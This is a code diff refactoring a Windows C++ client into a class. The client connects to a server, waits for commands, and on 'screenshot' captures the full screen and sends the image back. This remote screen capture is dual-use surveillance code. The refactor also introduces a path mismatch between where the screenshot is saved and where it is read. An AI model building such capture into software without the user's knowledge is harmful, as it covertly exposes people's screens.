@@ -1,19 +1,55 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
+#include "Client.h"
 #include <iostream>
-#include <winsock2.h>
 #include <windows.h>
 #include <Lmcons.h>
-#include <string>
 #include <thread>
-#include <vector>
+
+#include "Constants.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
-const int PORT = 5050;
-const char* SERVER_IP = "127.0.0.1"; 
+Client::Client(const char* serverIP_, u_short port_) : m_serverIP(serverIP_), m_port(port_) {
+    WSADATA wsData;
+    WORD DLLVersion = MAKEWORD(2, 1);
+    if (WSAStartup(DLLVersion, &wsData) != 0) {
+        std::cerr << "Error initializing Winsock" << std::endl;
+        exit(1);
+    }
 
-void captureScreenshot(const std::string& wPath) {
+    m_socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (m_socket == INVALID_SOCKET) {
+        std::cerr << "Can't create a socket! Quitting" << std::endl;
+        WSACleanup();
+        exit(1);
+    }
+
+    SOCKADDR_IN addr;
+    addr.sin_addr.s_addr = inet_addr(serverIP_);
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port_);
+
+    int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
+    if (connResult == SOCKET_ERROR) {
+        std::cerr << "Can't connect to server! Quitting" << std::endl;
+        closesocket(m_socket);
+        WSACleanup();
+        exit(1);
+    }
+}
+
+Client::~Client() {
+    closesocket(m_socket);
+    WSACleanup();
+}
+
+void Client::start() {
+    std::thread commandThread(&Client::listenForCommands, this);
+    commandThread.join();
+}
+
+void Client::captureScreenshot(const std::string& wPath) {
     BITMAPFILEHEADER bfHeader;
     BITMAPINFOHEADER biHeader;
     BITMAPINFO bInfo;
@@ -82,21 +118,17 @@ void captureScreenshot(const std::string& wPath) {
     DeleteObject(hBitmap);
 }
 
+void Client::sendScreenshot(SOCKET sock) {
+    const std::string screenshotFile = "screenshot.bmp";
+    captureScreenshot((Centaurus::contentPath / screenshotFile).string());
 
-void sendScreenshot(SOCKET sock) {
-    // Захватываем скриншот
-    const std::string& screenshotFile = "screenshot.bmp";
-    captureScreenshot(screenshotFile);
-
-    // Открываем файл скриншота
     FILE* file;
     errno_t err = fopen_s(&file, screenshotFile.c_str(), "rb");
     if (err != 0) {
-        std::cerr << "Error opening file for writing" << std::endl;
+        std::cerr << "Error opening file for reading" << std::endl;
         return;
     }
 
-    // Отправляем файл серверу
     char buffer[4096];
     while (!feof(file)) {
         int bytesRead = fread(buffer, 1, sizeof(buffer), file);
@@ -108,69 +140,20 @@ void sendScreenshot(SOCKET sock) {
     fclose(file);
 }
 
-void listenForCommands(SOCKET sock) {
+void Client::listenForCommands() {
     char buf[4096];
-    
     while (true) {
         ZeroMemory(buf, 4096);
-        int bytesReceived = recv(sock, buf, 4096, 0);
+        int bytesReceived = recv(m_socket, buf, 4096, 0);
         if (bytesReceived > 0) {
             std::string command(buf, 0, bytesReceived);
-            
             if (command == "screenshot") {
                 std::cout << "Received screenshot command" << std::endl;
-                sendScreenshot(sock);
-            }
-            else if (command == "exit") {
+                sendScreenshot(m_socket);
+            } else if (command == "exit") {
                 std::cout << "Server is shutting down" << std::endl;
-                break; // Завершаем работу клиента, если сервер отправил команду завершения
+                break;
             }
         }
     }
-}
-
-int main()
-{
-    WSADATA wsData;
-    WORD DLLVersion = MAKEWORD(2, 1);
-    if(WSAStartup(DLLVersion, &wsData) != 0) {
-        std::cerr << "Error" << std::endl;
-        return 1;
-    }
-
-    // Создаем сокет
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == INVALID_SOCKET) {
-        std::cerr << "Can't create a socket! Quitting" << std::endl;
-        WSACleanup();
-        return 1;
-    }
-
-    // Указываем адрес сервера
-    SOCKADDR_IN addr;
-    addr.sin_addr.s_addr = inet_addr(SERVER_IP);
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(PORT);
-
-    // Подключаемся к серверу
-    int connResult = connect(sock, (sockaddr*)&addr, sizeof(addr));
-    if (connResult == SOCKET_ERROR) {
-        std::cerr << "Can't connect to server! Quitting" << std::endl;
-        closesocket(sock);
-        WSACleanup();
-        return 1;
-    }
-
-    // Запускаем поток для получения команд от сервера
-    std::thread commandThread(listenForCommands, sock);
-    commandThread.join();
-
-    // Закрываем сокет
-    closesocket(sock);
-
-    // Очищаем Winsock
-    WSACleanup();
-    
-    std::cout << "Hello World!" << '\n';
-    return 0;
 }
